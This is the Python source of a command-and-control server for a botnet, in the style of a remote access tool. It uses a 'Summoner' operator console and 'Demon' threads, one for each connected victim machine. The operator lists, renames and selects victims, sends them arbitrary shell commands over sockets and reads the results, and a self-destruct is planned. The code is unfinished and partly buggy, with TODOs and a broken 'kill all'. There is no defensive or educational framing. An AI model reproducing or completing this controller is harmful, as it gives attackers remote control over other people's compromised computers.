#!/usr/bin/python3
import socket       
import sys          
import os           
import threading        
import queue  
import time

DemonHorde = {'1':'10.10.10.10'}
DemonThreads = []

class SummonerConsole(threading.Thread):
    def __init__(self,qv2):
        threading.Thread.__init__(self)
        self.q = qv2
 
    def run(self):
        while True:
            cmd = str(input("Summoner> "))
            if ("control" in cmd):
                strip = cmd.replace("control ", "")
                #key name should have no spaces
                selection = strip.replace(" ", "")
                if (DemonHorde.get(selection) != None):
                    DemonThread = DemonConsole(self.q, selection)
                    DemonThread.start()
            elif (cmd == "list demons" or cmd == "list"):
                for tname,addr in DemonHorde.items():
                    print("[",tname,"] ", addr)
            elif (cmd == "count demons" or cmd == "count"):
                print(str(len(DemonHorde)) + ' demons in your horde.')
            elif (cmd == "kill all"):
                for d in DemonThreads:
                    #TODO - test this/fix
                    DemonThread[d].q.put("exit")
            else:
                pass


class DemonConsole(threading.Thread):
    def __init__(self, qv2, ref2):
        threading.Thread.__init__(self)
        self.q = qv2
        self.ref = ref2

    def printHelp(self):
        print("[+] Enter any command you wish to attempt to run on the victim.")
        print("[*] You may also issue the following custom commands:")
        print("[+] exit (kill): Kills demon")
        print("[+] rename (rn): Renames demon")
        print("[+] self destruct (sd): Demon will remove itself from the victim and exit")

    def run(self):
        sd = False
        while True:
            cmd = str(input("Demon " + str(self.ref) +">"))

            if (cmd == ""):
                pass
            elif (cmd == "self destruct" or cmd == "sd"):
                print("Self destruct command issued.")
                #TODO implement self destruct on binary on victim
                self.q.put(cmd)
                sd = True
                continue
            #kill demon
            elif (cmd == "exit" or sd == True):
                print("Killing demon..." + self.ref)
                #TODO implement
                #remove from threads/horde
                #exit thread
                #fix sd flag
                #return to summoner console
                '''
                for i in range(len(DemonThreads)):
                    time.sleep(0.1)
                    self.q.put(cmd)
                time.sleep(5)
                os._exit(0)
                '''
            #rename the demon
            elif ("rename" in cmd or "rn" in cmd):
                #TODO test
                selection = str(cmd.replace("rename ", ""))
                DemonHorde[selection] = DemonHorde[self.ref]
                del DemonHorde[self.ref]
                print("[!] Demon renamed to '"+ selection+ "'.")
            #run command on this demon
            else:
                print("[+] Demon performing command " + cmd + "...")
                self.q.put(cmd)


class Demon(threading.Thread):
    def __init__(self, client, client_address, qq):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qq

    def run(self):
        #assign the demon a number
        #this is probably broken if it gets relaunched...need to add check to persist renaming changes
        DemonNumber = len(DemonHorde) + 1
        print("[*] Demon reporting in from" + self.ip + ":" + str(self.port) + ". Assigned number ", DemonNumber)
        DemonHorde[DemonNumber] = self.client_address
        while True:
            CommandReceived = self.q.get()
            # print("\nReceived Command: " + RecvBotCmd + " for " + BotName)
            try:
                self.client.send(CommandReceived.encode('utf-8'))
                recvVal = (self.client.recv(1024)).decode('utf-8')
                print(recvVal)
            except Exception as ex:
                print(ex)
                break